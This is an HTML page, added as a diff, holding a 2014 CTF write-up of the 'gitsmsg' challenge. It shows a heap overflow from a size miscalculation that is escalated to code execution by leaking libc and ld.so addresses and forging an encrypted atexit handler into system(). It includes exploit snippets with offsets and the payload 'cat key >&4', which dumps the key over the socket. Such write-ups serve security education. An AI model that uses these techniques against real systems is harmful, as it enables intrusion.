@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <title>Ghost in the Shellcode 2014 - gitsmsg</title>
+        <meta charset="utf-8" />
+        <link rel="stylesheet" href="http://codearcana.com/theme/css/main.css" type="text/css" />
+        <link href="http://codearcana.com/" type="application/atom+xml" rel="alternate" title="Code Arcana ATOM Feed" />
+
+
+        <!--[if IE]>
+                <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+        <!--[if lte IE 7]>
+                <link rel="stylesheet" type="text/css" media="all" href="http://codearcana.com/css/ie.css"/>
+                <script src="http://codearcana.com/js/IE8.js" type="text/javascript"></script><![endif]-->
+
+        <!--[if lt IE 7]>
+                <link rel="stylesheet" type="text/css" media="all" href="http://codearcana.com/css/ie6.css"/><![endif]-->
+
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="http://codearcana.com/index.html">Code Arcana </a></h1>
+                <nav><ul>
+                    <li><a href="http://codearcana.com">Blog</a></li>
+                    <li><a href="http://codearcana.com/archives.html">Archives</a></li>
+                    <li ><a href="http://codearcana.com/pages/about.html">About</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+
+<section id="content" class="body">
+<article>
+        <header> <h1 class="entry-title"><a href="posts/2014/01/19/ghost-in-the-shellcode-2014-gitsmsg.html"
+        rel="bookmark" title="Permalink to Ghost in the Shellcode 2014 - <code>gitsmsg</code>">Ghost in the Shellcode 2014 - <code>gitsmsg</code></a></h1> <a href="http://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-via="awreece">Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>
+ </header>
+<footer class="post-info">
+        <abbr class="published" title="2014-01-19T00:00:00">
+                Sun 19 January 2014
+        </abbr>
+
+        <address class="vcard author">
+                By <a class="url fn" href="http://codearcana.com/author/alex-reece.html">Alex Reece</a>
+        </address>
+<p>In <a href="http://codearcana.com/category/security.html">security</a>. </p>
+<p>tags: <a href="http://codearcana.com/tag/ctf.html">ctf</a><a href="http://codearcana.com/tag/exploitation.html">exploitation</a></p></footer><!-- /.post-info --><!-- /.post-info -->
+        <div class="entry-content">
+        <p><em>tl;dr</em> - <code>gitsmsg</code> is a messaging server. A heap overflow led to arbitrary read / write and eventual code exec 
+after circumventing RELRO. Binary and exploit available <a
+href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/gitsmsg.tar.gz">here</a>. Cross post from 
+<a href="http://ppp.cylab.cmu.edu/wordpress/?p=1152">PPP blog</a>.</p>
+<h2>The program</h2>
+<p>First, we reverse engineered much of the binary. 
+You "login" as a user, then can compose messages to other users. The messages
+were saved to a linked list and could be edited before being serialized to disk.
+Each message is a tagged union of <code>{byte,dword,double}{_,array}</code>
+or <code>string</code>. A <code>string</code> indexed into an array of static strings.
+A "typical" usage might be:</p>
+<div class="highlight"><pre><span class="c"># After connection, appropriate functions hide the binary protocol.</span>
+<span class="n">login</span><span class="p">(</span><span class="s">&quot;alex&quot;</span><span class="p">)</span>
+<span class="n">newmessage</span><span class="p">(</span><span class="n">to</span><span class="o">=</span><span class="s">&quot;andrew&quot;</span><span class="p">,</span> <span class="n">msg_type</span><span class="o">=</span><span class="n">DWORD_ARRAY</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="mi">17</span><span class="p">)</span>
+<span class="n">newmassage</span><span class="p">(</span><span class="n">to</span><span class="o">=</span><span class="s">&quot;max&quot;</span><span class="p">,</span> <span class="n">msg_type</span><span class="o">=</span><span class="n">STRING</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">msgid</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="mi">14</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="n">msgid</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">save</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">disconnect</span><span class="p">()</span>
+</pre></div>
+
+
+<h2>The vulnerability</h2>
+<p>In short, when initializing one of the message type, the programmer forgot to
+factor the data type width when calculating the message size:</p>
+<div class="highlight"><pre><span class="k">case</span> <span class="n">DOUBLE_ARRAY</span>:
+  <span class="n">size</span> <span class="o">=</span> <span class="n">count</span><span class="p">;</span>
+  <span class="n">size</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">count</span><span class="p">;</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mh">0x3FF</span><span class="p">;</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1023</span><span class="p">;</span>
+  <span class="n">v0</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">=</span> <span class="n">count</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="n">v3</span> <span class="o">|</span> <span class="n">v4</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">goto</span> <span class="n">LABEL_9</span><span class="p">;</span>
+  <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</pre></div>
+
+
+<p>This eventually gives us a heap overwrite:</p>
+<div class="highlight"><pre><span class="n">result</span> <span class="o">=</span> <span class="n">readAll</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</pre></div>
+
+
+<p>At this point, it seems relatively straightforward. We will allocate 2 messages,
+leaving the heap in this state:</p>
+<div class="highlight"><pre>| message A | data A | message B |
+</pre></div>
+
+
+<p>We then free the first message:</p>
+<div class="highlight"><pre>| &lt;free&gt; | &lt;free&gt; | message B |
+</pre></div>
+
+
+<p>And allocate a new message of type <code>DOUBLE_ARRAY</code>, allowing us to overwrite and
+modify the second message:</p>
+<div class="highlight"><pre>| message C | data C ... essage B |
+</pre></div>
+
+
+<p>Our goal will be to overwrite a GOT entry and give us a shell. Since the program
+is PIE, we have to leak an address first. We do this by editing the second
+message which does 2 things for us: it allows us to put it back into a valid
+state, and it will put a address from the <code>.data</code> segment into the heap (if a 
+<code>string</code> message is edited, it will update the message data pointer to point
+to the correct string in the <code>.data</code> segment). </p>
+<p>Actually, at this point we have an arbitrary read and an arbitrary write
+primitive. Since the data for the first message overlaps with the type and 
+pointer of the second message, we can edit the first message to change the type
+of the second. If we change the type of the second message to <code>dword</code> and its
+pointer to <code>&lt;address&gt;</code>, we can get the contents of the second message to read 
+from that address and edit the contents of the second message to write to that
+address.</p>
+<p>Once we have the program base, we use our arbitrary read primitive to leak a
+<code>libc</code> address. We know it is an Ubuntu machine, so we download a couple versions
+of <code>libc</code> and compare the address to the symbol in each of the versions to match
+the correct <code>libc</code> version. We can now overwrite <code>free</code> with <code>system</code> and delete
+our message to get a shell!</p>
+<div class="highlight"><pre><span class="n">free_addr</span> <span class="o">=</span> <span class="n">arbitrary_read</span><span class="p">(</span><span class="n">prog_base</span> <span class="o">+</span> <span class="mh">0x4f2c</span><span class="p">)</span>
+<span class="n">head</span> <span class="o">=</span> <span class="n">prog_base</span> <span class="o">+</span> <span class="mh">0x5160</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">free_addr</span> <span class="o">-</span> <span class="mh">0x781b0</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3d170</span>
+</pre></div>
+
+
+<p>Except this didn't work - the program had full RELRO support, so the GOT was
+read only. </p>
+<p>To get around this, we had to do some painful stuff. We noticed a directory
+traversal attack in the login function, and though we could use that to put the
+key into the heap (and read it later). Unfortunately, the <code>malloc</code>
+implementation  seemed to clobber the key after it freed the blob. Instead, 
+our strategy
+was to overwrite an <code>atexit</code> handler function pointer located in <code>libc</code> with the
+address of <code>system</code> and to overwrite the argument for this handler with a buffer
+we controlled. Unfortunately, this function pointer was encrypted. To decrypt, 
+we computed what the function pointer was supposed to be by leaking an address 
+from <code>ld.so</code> and using the address and the encrypted value to calculate the key.</p>
+<div class="highlight"><pre><span class="n">rtld_global_ro_address</span> <span class="o">=</span> <span class="n">arbitrary_read</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1a0ef8</span><span class="p">)</span>
+<span class="n">ld_base</span> <span class="o">=</span> <span class="n">rtld_global_ro_address</span> <span class="o">-</span> <span class="mh">0x20ca0</span>
+<span class="n">ld_fini_address</span> <span class="o">=</span> <span class="n">ld_base</span> <span class="o">+</span> <span class="mh">0xf270</span>
+<span class="n">encrypted_atexit_handler</span> <span class="o">=</span> <span class="n">arbitrary_read</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1a21ec</span><span class="p">)</span>
+<span class="n">xor_key</span> <span class="o">=</span> <span class="n">ror</span><span class="p">(</span><span class="n">encrypted_atexit_handler</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">^</span> <span class="n">ld_fini_address</span>
+</pre></div>
+
+
+<p>We then encrypted our target address with this key, update the function pointer
+to use our new address and updated the argument to point to a buffer we
+controlled</p>
+<div class="highlight"><pre><span class="n">encrypted_system</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="n">system_addr</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>
+<span class="n">arbitrary_write</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1a21ec</span><span class="p">,</span> <span class="n">encrypted_system</span><span class="p">)</span>
+<span class="n">arbitrary_write</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1a21f0</span><span class="p">,</span> <span class="n">obj0</span> <span class="o">+</span> <span class="mh">0x110</span><span class="p">)</span>
+</pre></div>
+
+
+<p>To trigger our exploit, we just sent the disconnect message (which fortunately 
+didn't disconnect the socket). For our final exploit, we used the payload 
+<code>cat key &gt;&amp;4</code> to dump the key to the already open socket.</p>
+<div class="highlight"><pre><span class="gp">$</span> python gitsmsg.py
+<span class="go">Deleting messages ...</span>
+<span class="go">Performing overflow ...</span>
+<span class="go">Editing ...</span>
+<span class="go">Getting ...</span>
+<span class="go">Getting libc base ...</span>
+<span class="go">Getting ld base ...</span>
+<span class="go">Writing encrypted function pointer ...</span>
+<span class="go">The key is: lol, tagged unions for the WIN!</span>
+<span class="go">*** Connection closed by remote host ***</span>
+</pre></div>
+        </div><!-- /.entry-content -->
+        <div class="comments">
+        <h2>Comments !</h2>
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+               var disqus_identifier = "posts/2014/01/19/ghost-in-the-shellcode-2014-gitsmsg.html";
+               (function() {
+               var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+               dsq.src = 'http://codearcana.disqus.com/embed.js';
+               (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+              })();
+            </script>
+        </div>
+
+</article>
+</section>
+
+        <aside id="sidebar">
+                <div class="widget">
+                        <h2>Categories</h2>
+                        <ul>
+                           <li ><a href="http://codearcana.com/category/performance.html">performance</a></li>
+                           <li class="active"><a href="http://codearcana.com/category/security.html">security</a></li>
+                           <li ><a href="http://codearcana.com/category/software-engineering.html">software engineering</a></li>
+                        </ul>
+		</div>
+		<div class="widget">
+		    <h2>Tags</h2>
+		    <ul class="cloud">
+			<li class="tag-2">
+			  <a class="tag" href="http://codearcana.com/tag/golang.html">golang</a>
+			</li>
+			<li class="tag-4">
+			  <a class="tag" href="http://codearcana.com/tag/mac-osx.html">mac osx</a>
+			</li>
+			<li class="tag-4">
+			  <a class="tag" href="http://codearcana.com/tag/bash.html">bash</a>
+			</li>
+			<li class="tag-4">
+			  <a class="tag" href="http://codearcana.com/tag/make.html">make</a>
+			</li>
+			<li class="tag-4">
+			  <a class="tag" href="http://codearcana.com/tag/malloc.html">malloc</a>
+			</li>
+			<li class="tag-2">
+			  <a class="tag" href="http://codearcana.com/tag/ctf.html">ctf</a>
+			</li>
+			<li class="tag-1">
+			  <a class="tag" href="http://codearcana.com/tag/profiling.html">profiling</a>
+			</li>
+			<li class="tag-4">
+			  <a class="tag" href="http://codearcana.com/tag/theory.html">theory</a>
+			</li>
+			<li class="tag-1">
+			  <a class="tag" href="http://codearcana.com/tag/tutorial.html">tutorial</a>
+			</li>
+			<li class="tag-1">
+			  <a class="tag" href="http://codearcana.com/tag/exploitation.html">exploitation</a>
+			</li>
+		    </ul>
+		</div>
+
+
+                <div class="widget blogroll">
+                        <h2>Blogroll</h2>
+                        <ul>
+                            <li><a href="http://ppp.cylab.cmu.edu/wordpress/">PPP Blog</a></li>
+                            <li><a href="http://www.codinghorror.com/blog/">Coding Horror</a></li>
+                            <li><a href="http://blog.regehr.org/">Embedded in Academia</a></li>
+                            <li><a href="http://highscalability.com/">High Scalability</a></li>
+                            <li><a href="http://coderweekly.com/">Coder Weekly</a></li>
+                            <li><a href="http://www.phrack.org/">phrack</a></li>
+                            <li><a href="http://jbremer.org/">skier_'s blog</a></li>
+                            <li><a href="http://dtrace.org/blogs">dtrace blog</a></li>
+                        </ul>
+                </div><!-- /.blogroll -->
+                <div class="widget social">
+                        <h2>Social</h2>
+			<ul>
+                            <li><a href="http://codearcana.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
+
+				<li><a href="https://twitter.com/awreece">twitter</a></li>
+				<li><a href="https://github.com/awreece">github</a></li>
+				<li><a href="https://plus.google.com/106589059588263736517/posts">google+</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </aside><!-- /#sidebar -->
+    <script type="text/javascript">
+    var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+    document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+    <script type="text/javascript">
+    try {
+        var pageTracker = _gat._getTracker("UA-40107691-1");
+    pageTracker._trackPageview();
+    } catch(err) {}</script>
+</body>
+</html>
